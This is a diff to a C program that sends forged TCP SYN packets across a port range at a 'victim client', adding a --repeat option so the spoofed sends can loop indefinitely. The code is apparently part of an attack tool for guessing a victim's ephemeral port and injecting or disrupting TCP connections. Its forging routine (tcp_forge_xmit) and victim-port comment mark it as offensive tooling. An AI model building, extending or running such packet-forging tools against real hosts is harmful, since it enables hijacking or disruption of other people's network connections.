@@ -79,6 +79,7 @@ void print_usage(char *prog)
     printf("Options:\n");
     printf("    --ports (-p)  : port range to send SYNs over\n");
     printf("    --delay (-d)  : microseconds to delay between each send\n");
+    printf("    --repeat (-r) : number of times to repeat. 0 for inifinite\n");
     printf("\n");
 }
 
@@ -92,6 +93,7 @@ int main(int argc, char *argv[])
     struct option long_opts[] = {
         {"ports", 1, 0, 'p'},
         {"delay", 1, 0, 'd'},
+        {"repeat", 1, 0, 'r'},
         {0, 0, 0, 0}
     };
     char *daddr;
@@ -99,8 +101,9 @@ int main(int argc, char *argv[])
     char *saddr;
     int delay = 0;
     int sport;
+    int repeat = 1;
 
-    while ((opt = getopt_long(argc, argv, "p:d:", long_opts, &opt_index)) != -1) {
+    while ((opt = getopt_long(argc, argv, "p:d:r:", long_opts, &opt_index)) != -1) {
         switch (opt) {
         case 'p':
             dport_low = get_low_port(optarg);
@@ -108,6 +111,11 @@ int main(int argc, char *argv[])
             break;
         case 'd':
             delay = atoi(optarg);
+            break;
+        case 'r':
+            repeat = atoi(optarg);
+            if (repeat == 0)
+                repeat = -1;
             break;
         default:
             print_usage(argv[0]);
@@ -156,16 +164,21 @@ int main(int argc, char *argv[])
     unsigned int last_pct_done = 0;
     uint16_t dport;
 
-    for (dport=dport_low; dport <= dport_high; dport++) {
+    do {
 
-        delay_until(&last_time, delay);
+        for (dport=dport_low; dport <= dport_high; dport++) {
 
-        pkt.dport = htons(dport);   // Victim client's port (our guess)
+            delay_until(&last_time, delay);
 
-        if (tcp_forge_xmit(&pkt, NULL, 0)) {
-            fprintf(stderr, "noo\n");
+            pkt.dport = htons(dport);   // Victim client's port (our guess)
+
+            if (tcp_forge_xmit(&pkt, NULL, 0)) {
+                fprintf(stderr, "noo\n");
+            }
         }
-    }
+        if (repeat > 0)
+            repeat--;
+    } while (repeat != 0);
 
     return 0;    
 }
